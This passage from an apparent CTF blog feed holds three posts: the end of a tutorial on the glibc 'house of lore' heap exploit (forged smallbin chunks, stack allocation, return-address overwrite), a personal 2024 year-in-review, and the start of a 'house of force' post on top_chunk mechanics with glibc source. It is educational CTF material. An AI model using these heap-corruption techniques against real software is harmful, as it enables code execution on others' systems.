src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222195535950.png" alt="image-20250222195535950"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222203615042.png" alt="image-20250222203615042"></p><ul><li>这时我们再申请一个<code>0x100</code>大小的堆块，由于<code>smallbin</code>中的堆块是<code>先进先出</code>，主要取出的是<code>bins-&gt;bk</code>所指堆块，所以我们就将<code>stack_buffer1</code>处的这个堆块给申请过来了。</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222210844748.png" alt="image-20250222210844748"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222210904519.png" alt="image-20250222210904519"></p><ul><li>这时我们就申请到栈上的数据了，并且我们可以将<code>jackpot</code>的地址写入到栈上了，这时我们就覆盖这个函数的地址为返回地址</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222211156756.png" alt="image-20250222211156756"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222211214582.png" alt="image-20250222211214582"></p><h1 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h1><ul><li>现在就给这个<code>house of lore</code>的利用方式做一个总结。首先<code>house of lore</code>这个堆块的利用方式是针对的是<code>smallbin</code>。</li><li>漏洞利用的条件：<ul><li>需要<code>UAF</code>漏洞，这样才能对<code>smallbin</code>中堆块的<code>bk</code>指针进行修改（如果没有<code>UAF</code>漏洞可以尝试使用<code>off-by-null</code>漏洞尝试使用堆风水，去构造UAF漏洞）</li><li>还需要知道堆地址，这样我们在伪造<code>fake_chunk</code>的时候才能向<code>fake_chunk-&gt;fd</code>指针这个位置写入<code>chunk_adddr</code>从而绕过检查</li><li>可能还需要栈地址或者是其他段地址，这样我们在申请任意堆块内存的时候就可以绕过检查</li></ul></li><li>接下来归纳一下我们需要伪造的堆块的数据有哪些：<ul><li>对于放入<code>smallbin</code>中的堆块<code>victim</code>，我们需要修改其<code>bk</code>指针，修改<code>bk</code>指针为<code>fake_chunk1_addr</code></li><li>对于我们要申请的目标地址<code>fake_chunk1</code>，我们要伪造其<code>fd</code>指针，使得其<code>fd</code>指针指向<code>victim</code>，使得<code>bk</code>指针指向<code>fake_chunk2</code></li><li>对于我们要借助绕过申请目标地址的辅助<code>chunk</code>即<code>fake_chunk2</code>，我们要修改其<code>fd</code>指针为<code>fake_chunk1</code></li></ul></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222212206861.png" alt="image-20250222212206861"></p><h1 id="house-of-lore_level1"><a class="markdownIt-Anchor" href="#house-of-lore_level1"></a> house-of-lore_level1</h1><h1 id="house-of-lore_level2"><a class="markdownIt-Anchor" href="#house-of-lore_level2"></a> house-of-lore_level2</h1><p>​</p>]]></content>
    
    
    <summary type="html">前言：好像进度慢了QAQ</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>2024年度总结</title>
    <link href="http://iyheart.github.io/2025/02/01/%E6%80%BB%E7%BB%93/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>http://iyheart.github.io/2025/02/01/%E6%80%BB%E7%BB%93/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
    <published>2025-01-31T17:37:18.000Z</published>
    <updated>2025-01-31T18:10:48.565Z</updated>
    
    <content type="html"><![CDATA[<ul><li>过个年，走个亲戚后就有点学不进去了（也许是想学的东西太多了，学不过来就有点想摆了），31号摆了一天，就现在已经是25年2月1号了，就想着把年度总结给写完。</li></ul><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><h2 id="2024年完成的"><a class="markdownIt-Anchor" href="#2024年完成的"></a> 2024年完成的</h2><ol><li>看书《许三观卖血记》、《三体I》、《三体II》、《番茄工作法》（虽然不想把这本书放上来，但是实在没东西放了。）</li></ol><details><summary>四本书感受简述</summary><p>《许三观卖血记》：总体来说就是非常刀，算是对当时社会现实的真实写照。算是在书中体会到了过日子的不容易。</p><p>《三体I》和《三体II》：确实比较科幻，大部分情节上设定很不错，但是对几处情节的设定我没怎么读明白。到现在也过了二、三个月了，大部分情节都忘干净了，只记得几处比较深刻的情节。</p><p>《番茄工作法》：当时是为了提高自己的学习效率从而阅读的这边书。花了个两天阅读了这本书，马上开始实践了（这时距离大一的暑假结束只有10天），规划了一下时间，学习效率堪比在学校学习一个月。不过来学校之后没有坚持下去。争取2025年这个寒假坚持下去。</p></details><ol start="2"><li>入门了CTF，入门PWN方向，密码方向还没有入门，还差点沉淀才能入门。逆向感觉门都还没入。</li><li>通过了英语四级（感觉这个没啥好说的，但是不说又没东西写。）</li></ol><p><strong>好像没了QAQ</strong>，自我感觉就是，今年大部分时间都在忙，但是并没有完成什么。</p><h2 id="2024年未完成的"><a class="markdownIt-Anchor" href="#2024年未完成的"></a> 2024年未完成的</h2><ul><li>2024年打算完成的（个人觉得有能力完成，但是并没有完成的，比较遗憾）</li></ul><ol><li>在暑假阅读《CSAPP》，暑假两个月的时间，阅读一本CSAPP感觉是可能的，但是由于假期松懈了，所以并没有完成。</li><li>学习PWN的堆利用的一些列方法，还是暑假松懈了。导致PWN的学习进度好像落后很多。再加上入门又晚（pwn的话算是2024年三月份开始入门的）。</li><li>学习做几道好菜，从没高考的时候就开始想着要学习做几道能拿的出手的菜，但是也没花时间下功夫。</li><li>《三体III》还没有阅读完，2024年10月初的时候阅读完了《三体II》，《三体III》算是没有时间读下去了。</li></ol><p>比较遗憾的就是以上这些，其他的小遗憾就不写了。</p><h2 id="2025年希望的"><a class="markdownIt-Anchor" href="#2025年希望的"></a> 2025年希望的</h2><ol><li>今年能够看够<code>5</code>本比较深刻的书。</li><li>今年能在比赛取得一些好成绩（就目前看来还是我还是太菜了QAQ）。</li><li>今年能看完《CSAPP》。</li><li>希望今年能把六级过了。</li><li>其他的再说吧</li></ol><h1 id="回顾"><a class="markdownIt-Anchor" href="#回顾"></a> 回顾</h1><h2 id="2023年6-8月"><a class="markdownIt-Anchor" href="#2023年6-8月"></a> 2023年6-8月</h2><ul><li>高考完的暑假：高考完的暑假我并没有闲下来疯狂完游戏、去旅游等，并且在暑假也了解到了CTF，但是仅仅知道他这个比赛是一个夺旗赛而已，并没有深入了解，打算等自己有基础的时候再去了解。于是8月的时候就开始，从8月到11月我草草的看完了《计算机科学导论》这本书，对计算机领域的相关知识有了稍微全面的了解。在看《计算机科学导论》的同时，我还有看了《C primer plus》这本C语言书，这本书后来发现并不适合新手入门学习，但是还是坚持把这本书看下去了，可最后还没看完。大一上还浅浅学习了一下计算机网络的内容。<strong>但是就是没有去入门CTF，QAQ</strong>。当时没有入门CTF还有一个原因就是当时懵懵的，和一个高中同学组队打了2023年福建省数据安全大赛（只打了线上CTF模式），结果爆零了，被打自闭了，然后就告诉自己打基础、打基础。</li></ul><h2 id="2023年9月"><a class="markdownIt-Anchor" href="#2023年9月"></a> 2023年9月</h2><ul><li>大一这一年只能说是有目标，但是目标并不是很明确。在这个过程中也走了弯路。同时对自己有了更深刻的了解。我记得当时是<code>9</code>月<code>16</code>号开学，开学后军训，军训期间还是比较摆的，没学什么东西。然后9月就这么过了。</li></ul><h2 id="2023年10月"><a class="markdownIt-Anchor" href="#2023年10月"></a> 2023年10月</h2><ul><li>这个月就进入大学的课程了，专心卷课内智育了，这期间也就和一个高中同学（在同一个大学，但是不再同一个专业）去打了2023年福建省数据安全大赛，之后就陷入打基础的误区，月底的时候，我们学长来向我们介绍<code>CTF</code>竞赛，并且让我们自己动手搭建一个属于自己的博客。</li><li>由于对电脑的一些东西还是不太理解，所以陆陆续续搭了一个星期，并且上传了一个<code>python</code>的学习笔记。</li></ul><h2 id="2023年11-12月"><a class="markdownIt-Anchor" href="#2023年11-12月"></a> 2023年11-12月</h2><ul><li>想入门CTF的web方向，但是始终没找准入门点去切入。还是继续在打坤础，课内也是酷酷卷。</li></ul><h2 id="2024年1月"><a class="markdownIt-Anchor" href="#2024年1月"></a> 2024年1月</h2><ul><li>期末考完回家，美化了博客，买了<code>51</code>单片机和<code>STM32</code>单片机，因为大一上学完了数电想去玩玩单片机。并且月底的时候<code>hgame</code>也开赛了。但是由于感觉什么都没入门，打什么题都一脸懵，就才做出来一题还是两题就摆烂了。</li><li>总结：大一寒假摆占大部分。</li></ul><h2 id="2024年2月"><a class="markdownIt-Anchor" href="#2024年2月"></a> 2024年2月</h2><ul><li>学长在2月底为我们23级的举办了一场新生赛，而在这场新生赛中，我也算是入门了一下CTF了，而且由于<code>pwn</code>比较偏底层，并且我有读研的打算所以就没走<code>web</code>，最后就去打<code>pwn</code>去了。</li><li>总结：入门就是应该打打新生赛，拼的就是信息搜索的能力。</li></ul><h2 id="2024年3月"><a class="markdownIt-Anchor" href="#2024年3月"></a> 2024年3月</h2><ul><li>开始真正的入门<code>pwn</code>，开始狂补pwn的知识，然后课内的就上课听一下，其他时间基本上都在看<code>pwn</code>的入门和其他前置知识，然后就学了<code>ret2text</code>和<code>ret2libc</code>这两个比较入门的题目。</li><li>并且打了几个不是新生赛的比赛，都爆0了，也就只能继续看视频打基础了。</li></ul><h2 id="2024年4月"><a class="markdownIt-Anchor" href="#2024年4月"></a> 2024年4月</h2><ul><li>这个月牢了一下<code>xyctf</code>，但是也没牢出来几题。同时也学习了字符串格式化漏洞。还有一堆大学的课和琐事，当时压力确实非常大，不过比起大二上学期，压力还是小了。</li><li>这个月我记得非常清楚的一件事是在<code>蓝桥杯</code>比赛的那一周的周四，吃坏肚子了，整个人都上吐下泄的，第二天都虚掉了。（还好当时蓝桥杯没交报名费，要不然真的就是白给了。）</li></ul><h2 id="2024年5月"><a class="markdownIt-Anchor" href="#2024年5月"></a> 2024年5月</h2><ul><li>打了一下<code>pycc</code>，当时打了一题擂台赛的简单<code>pwn</code>题，一题打了<code>3</code>天还是打不出来。最后还是打出来了QAQ。五月的话打算入门一下堆的，但是堆由于代码量等一些问题迟迟没有入门。五月份的<code>pwn</code>进度没有下去，算是在巩固前面所学的知识吧。</li></ul><h2 id="2024年6月"><a class="markdownIt-Anchor" href="#2024年6月"></a> 2024年6月</h2><ul><li>这个月期末月，除了点堆的基础外，其他基本上没什么看的了。大部分时间都在应付期末考。</li></ul><h2 id="2024年7-8月"><a class="markdownIt-Anchor" href="#2024年7-8月"></a> 2024年7-8月</h2><ul><li>大学的第一个暑假，还是呆在家里。在家里想学一些堆，但是由于很多问题（<code>libc</code>版本问题，<code>docker</code>拉不到本地的问题，<code>代码</code>审计的问题）直接开摆了。很少学pwn的新东西了。但也没有寒假那么摆，也有学东西就是了。</li></ul><h2 id="2024年9-12月"><a class="markdownIt-Anchor" href="#2024年9-12月"></a> 2024年9-12月</h2><ul><li>大二上学期确实比大一下学期压力还大，各种比赛，课内的课也非常多（尤其是3门408，在来一个信息安全数学基础）。</li><li>之后就是<code>强网杯</code>、<code>美亚杯</code>、<code>ciscn</code>。<code>强网杯</code>和<code>ciscn</code>可太牢了。中间还打了一个极客大挑战，拿到了贴纸。</li><li>这个学期比赛多、课程多、加上大二上非常内耗，但是也算是入门了堆。</li><li>总之感觉大二上过得很充实，但又过得不充实，自己还是没有发育起来。（想利用大二寒假好好沉淀一番，尽管寒假也只剩最后16天了，但是16天也能学到很多的。）</li></ul><h1 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h1><ul><li><p>感觉我的这个年度总结也就是把过去的事情回忆一遍而已，回过头来看这个，我也就只是一个平凡的普通人。但是自己心里总是有一些不切实际的幻想，总是幻想着自己实力强大，比赛的题都能解出来（好中二…）。</p></li><li><p>只能说目标还没达到，还需要继续爆肝。(如果现在打pwn能像初二那会看小说一样疯狂（10天，平均每天只睡3、4小时吧，可能，有一俩天甚至只睡1个小时））</p></li><li><p>还有一个纠结的地方：想打比赛，也想兼顾学业（因为打算读研），时间是远远不够的，好难受。</p></li></ul>]]></content>
    
    
    <summary type="html">前言：迟来的年度总结</summary>
    
    
    
    <category term="年度总结" scheme="http://iyheart.github.io/categories/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house-of-force</title>
    <link href="http://iyheart.github.io/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/"/>
    <id>http://iyheart.github.io/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/</id>
    <published>2025-01-29T12:50:37.000Z</published>
    <updated>2025-02-12T13:35:34.228Z</updated>
    
    <content type="html"><![CDATA[<ul><li><code>house of force</code>的利用有一个<code>glibc</code>的适用范围，该范围在<code>glibc2.23</code>到<code>glibc2.29</code>。在<code>glibc2.29</code>之后增加了相关的检测，导致<code>house of force</code>基本失效。</li><li><a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#23-house-of-force">Glibc堆利用之house of系列总结 - roderick - record and learn!</a></li><li><code>house of force</code>不需要伪造堆块，这个堆利用比较好理解。</li></ul><h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1><ul><li>top_chunk也有用上堆块的<strong>隐式链表技术</strong></li></ul><h2 id="top_chunk运行机制"><a class="markdownIt-Anchor" href="#top_chunk运行机制"></a> top_chunk运行机制</h2><ul><li><p><code>top_chunk</code>是一个比较特殊的chunk，这里就先简单叙述一下<code>top_chunk</code>的运行机制</p><ul><li>当一个程序一次<code>malloc</code>都没有进行的时候，它并不会被分配<code>top_chunk</code>，此时的堆并没有被初始化。</li><li>当程序第一次使用<code>malloc</code>的时候，先会通过系统调用向操作系统申请内存，这个申请过来的内存会放入<code>top_chunk</code>这边，此时<code>av-&gt;top</code>(top是一个指向chunk的指针)会指向<code>top_chunk</code>（准确的来说是指向<code>top_chunk</code>的起始位置，即指向<code>top_chunk</code>的<code>prev_size</code>位），然后会从<code>top_chunk</code>中切割一个一块<code>chunk</code>给用户使用。（切割后会更新<code>av-&gt;top</code>，此时<code>top</code>指向的是更新后的<code>top_chunk</code>的起始地址）****</li><li>然后当程序再次使用<code>malloc</code>申请一个堆内存的时候<ul><li>先会判断<code>bins</code>中是否有符合要求的空闲堆块，如果没有就从<code>Top chunk</code>中切割一块出来，切割出来后会更新<code>main_arena</code>中<code>top</code>指针。</li><li>如果我们申请的堆块大小大于<code>Top_chunk</code>现有的大小，<code>Top_chunk</code>还会与<code>bins</code>中空闲的chunk合并，查看合并后的<code>top_chunk</code>的大小是否满足我们<code>malloc</code>所申请的堆块大小。（合并后的<code>Top_chunk</code>可能会放入<code>unsorted_bin</code>中，这个机制将在<code>house of orange</code>中利用）</li><li>以上都不满足的话就会通过<code>mmap</code>或者<code>brk</code>这两个系统调用，向操作系统申请额外的内存，扩展到<code>Top_chunk</code>中。</li></ul></li></ul></li><li><p>这里还有一个要注意的地方就是，</p><ul><li><code>glibc2.27即以前</code>，在第一次调用malloc时，通常会分配给程序中的<code>top_chunk</code>分配<code>128KB</code>左右的大小，这与这个定义有关<code>EFAULT_MMAP_THRESHOLD=128kb</code></li><li><code>glibc2.28</code>开始，在第一次调用malloc时，就会给<code>top_chunk</code>分配<code>256KB</code>左右的大小</li><li>还有一点要注意的就是，不一定每次分配都是<code>128KB</code>大小，还会因为页对齐等会导致申请过来的<code>top_chunk</code>大小在<code>128KB</code>左右浮动，可能是<code>132KB</code>等。</li></ul></li><li><p>以上就是<code>top_chunk</code>的运行机制，接下来给一个示例程序进行动态调试看看。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *p1,*p2,*p3;</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x20000</span>);</span><br><span class="line">    p3 = <span class="built_in">malloc</span>(<span class="number">0x10000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># gcc -o lab1 lab1.c</span></span><br><span class="line"># 环境：ubuntu16<span class="number">.04</span>,glibc2<span class="number">.23</span></span><br></pre></td></tr></table></figure><ul><li>接下来我们对该程序进行动态调试，这样来查看<code>top_chunk</code>的具体流程，当我们一次malloc都没调用的时候就会出现以下情况<ul><li>程序的堆空间还没有被初始化</li><li><code>main_arena</code>中的<code>top</code>指针还是空的</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211222615489.png" alt="image-20250211222615489"></p><ul><li>接下来我们调用一次malloc后就会出现如下情况<ul><li>这个时候我们就已经申请了一个<code>0x20</code>字节的堆块</li><li>此时<code>top_chunk</code>也有大小了。（top_chunk的大小可以算一下看看，是不是接近128KB）</li><li>此时我们的<code>top</code>指针也指向了<code>top_chunk</code>的起始地址</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211222823384.png" alt="image-20250211222823384"></p><ul><li>接下来我们再调用一个<code>malloc</code>函数，这个时候我们又申请了一个<code>0x20010</code>字节大小的堆块，这时会观察到如下情况<ul><li><code>Top_chunk</code>的size位变成了<code>0xfd1</code>，如果不包括标志位的话，刚好<code>0x20010+0xfd0=0x20fe0</code></li><li>此时的<code>top</code>指针仍然指向的是<code>top_chunk</code>的起始位置。</li><li>此时的<code>top_chunk</code>的内存足够，还不需要向操作系统申请内存空间</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211223145443.png" alt="image-20250211223145443"></p><ul><li>接下来再我们调用第3次的malloc函数，并查看堆块<ul><li>这时<code>top</code>指针还是指向的是堆块的头部</li><li>但是<code>top_chunk</code>的size位变成了<code>0x20fc1</code>，这就是向操作系统申请增加内存后的再分配给第3个堆块的结果。</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211223457677.png" alt="image-20250211223457677"></p><h2 id="top_chunk源码"><a class="markdownIt-Anchor" href="#top_chunk源码"></a> top_chunk源码</h2><ul><li>这里给出<code>malloc.c</code>中<code>_int_malloc</code>中关于<code>top_chunk</code>的相关源码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><ul><li>这里还给出源码中<code>av-&gt;top</code>中的<code>av</code>这个结构体实例对应着的具体的结构体，这边<code>av</code>是一个结构体指针，其指向的就是这个结构体，这个结构体变量名就是我们经常见到的<code>main_arena</code>。</li><li><code>main_arena</code>其实是一个全局变量</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><ul><li>这个实验也是来自<code>how2heap</code>中<code>glibc2.23</code>的<code>house-of-force</code></li></ul><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 